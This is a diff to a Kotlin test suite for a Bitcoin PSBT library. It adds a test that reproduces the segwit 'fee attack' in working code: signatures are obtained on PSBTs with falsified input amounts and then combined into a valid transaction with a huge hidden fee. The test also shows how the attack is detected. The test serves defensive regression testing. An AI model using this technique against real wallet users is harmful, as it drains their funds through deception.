@@ -875,9 +875,13 @@ class PsbtTestsCommon {
 
         assertEquals((updated.getInput(0)!! as Input.NonWitnessInput.PartiallySignedNonWitnessInput).sighashType, SIGHASH_SINGLE or SIGHASH_ANYONECANPAY)
         assertEquals((updated.getInput(OutPoint(inputTx, 2))!! as Input.WitnessInput.PartiallySignedWitnessInput).redeemScript, Script.pay2wpkh(priv2.publicKey()))
+
+        // we can add a non-segwit utxo to a segwit input, this can help detect when utxo amounts have been tampered with (see the "fee attack" test below)
+        val updated1 = updated.updateNonWitnessInput(inputTx, 3, derivationPaths = allDerivationPaths).right!!
+        assertEquals(updated1.inputs[3].nonWitnessUtxo!!.txOut[3], updated1.inputs[3].witnessUtxo)
+
         // We reject invalid updates.
         assertTrue(updated.updateWitnessInputTx(inputTx, 1, sighashType = SIGHASH_ALL).isLeft)
-        assertTrue(updated.updateNonWitnessInput(inputTx, 3, derivationPaths = allDerivationPaths).isLeft)
 
         val signed = updated.sign(priv1, 0)
             .flatMap { it.psbt.sign(priv1, 1) }
@@ -1078,6 +1082,72 @@ class PsbtTestsCommon {
         }
 
         assertTrue(finalTx.isRight)
+    }
+
+    @Test
+    fun `hack PSBT and overpay fees`() {
+        // this test demonstrates an attack where users may overpay fee
+        // 1) get users to sign a PSBT mutiple times, with utxo amounts that are much lower than the ones being spent. users will think that they're paying a small fee
+        // 2) collect the signatures and build a valid transaction that spends much more in fees than what the user thinks
+        // see https://blog.trezor.io/details-of-firmware-updates-for-trezor-one-version-1-9-1-and-trezor-model-t-version-2-3-1-1eba8f60f2dd for more details
+        val priv1 = PrivateKey.fromHex("0101010101010101010101010101010101010101010101010101010101010101")
+        val priv2 = PrivateKey.fromHex("0202020202020202020202020202020202020202020202020202020202020202")
+        val utxo1 = Transaction(2, listOf(), listOf(TxOut(Satoshi(15_000_000L), Script.pay2wpkh(priv1.publicKey()))), 0)
+        val utxo2 = Transaction(2, listOf(), listOf(TxOut(Satoshi(20_000_000L), Script.pay2wpkh(priv2.publicKey()))), 0)
+
+        // create a tx that spends our utxo, with an output of 20_000_000 sats: it pays a huge fee of 15_000_000 sats
+        val tx = Transaction(
+            version = 2L,
+            txIn = listOf(TxIn(OutPoint(utxo1, 0), 0), TxIn(OutPoint(utxo2, 0), 0)),
+            txOut = listOf(TxOut(Satoshi(20_000_000L), Script.pay2pkh(priv1.publicKey()))),
+            lockTime = 0
+        )
+
+        // first, lie about amount of utxo2
+        val psbt1 = Psbt(tx)
+            .updateWitnessInput(OutPoint(utxo1, 0), utxo1.txOut[0], null, Script.pay2pkh(priv1.publicKey()))
+            .flatMap { it.updateWitnessInput(OutPoint(utxo2, 0), utxo2.txOut[0].updateAmount(Satoshi(5_000_000L + 1000)), null, Script.pay2pkh(priv2.publicKey())) }
+            .right!!
+        val sig1 = psbt1.sign(priv1, 0).right!!.sig
+
+        // psbt tells us we only pay 1000 sats in fees
+        assertEquals(Satoshi(1000), psbt1.computeFees())
+        val spent = psbt1.inputs.sumOf { it.witnessUtxo!!.amount.toLong() }
+
+        // then lie about amount of utxo1
+        val psbt2 = Psbt(tx)
+            .updateWitnessInput(OutPoint(utxo1, 0), utxo1.txOut[0].updateAmount(Satoshi(1000)), null, Script.pay2pkh(priv1.publicKey()))
+            .flatMap { it.updateWitnessInput(OutPoint(utxo2, 0), utxo2.txOut[0], null, Script.pay2pkh(priv2.publicKey())) }
+            .right!!
+        val sig2 = psbt2.sign(priv2, 1).right!!.sig
+
+        // we believe we pay the same fee and have spent the same amount
+        assertEquals(Satoshi(1000), psbt2.computeFees())
+        val spent1 = psbt2.inputs.sumOf { it.witnessUtxo!!.amount.toLong() }
+        assertEquals(spent1, spent)
+
+        // and now we use sig1 and sig2 to sign a valid tx that spends 15 000 000 sats instead of 1000 !!
+        val psbt = Psbt(tx)
+            .updateWitnessInput(OutPoint(utxo1, 0), utxo1.txOut[0], null, Script.pay2pkh(priv1.publicKey()))
+            .flatMap { it.updateWitnessInput(OutPoint(utxo2, 0), utxo2.txOut[0], null, Script.pay2pkh(priv2.publicKey())) }
+            .flatMap { it.finalizeWitnessInput(0, ScriptWitness(listOf(sig1, priv1.publicKey().value))) }
+            .flatMap { it.finalizeWitnessInput(1, ScriptWitness(listOf(sig2, priv2.publicKey().value))) }
+            .right!!
+        assertEquals(Satoshi(15000000), psbt.computeFees())
+
+        val signedTx = psbt.extract().right!!
+        Transaction.correctlySpends(signedTx, listOf(utxo1, utxo2), ScriptFlags.STANDARD_SCRIPT_VERIFY_FLAGS)
+
+        // this attack can be detected if the full input tx is provided in the non-witness utxo field
+        val psbt3 = Psbt(tx)
+            .updateWitnessInput(OutPoint(utxo1, 0), utxo1.txOut[0], null, Script.pay2pkh(priv1.publicKey()))
+            .flatMap { it.updateNonWitnessInput(utxo1, 0) }
+            .flatMap { it.updateWitnessInput(OutPoint(utxo2, 0), utxo2.txOut[0].updateAmount(Satoshi(5_000_000L + 1000)), null, Script.pay2pkh(priv2.publicKey())) }
+            .flatMap { it.updateNonWitnessInput(utxo2, 0) }
+            .right!!
+        assertEquals(psbt3.inputs[1].witnessUtxo!!.publicKeyScript, psbt3.inputs[1].nonWitnessUtxo!!.txOut[0].publicKeyScript)
+        // we can see that the witness utxo amount does not match the amount of the corresponding output in the non-witness utxo
+        assertNotEquals(psbt3.inputs[1].witnessUtxo!!.amount, psbt3.inputs[1].nonWitnessUtxo!!.txOut[0].amount)
     }
 
     private fun readValidPsbt(hex: String): Psbt {
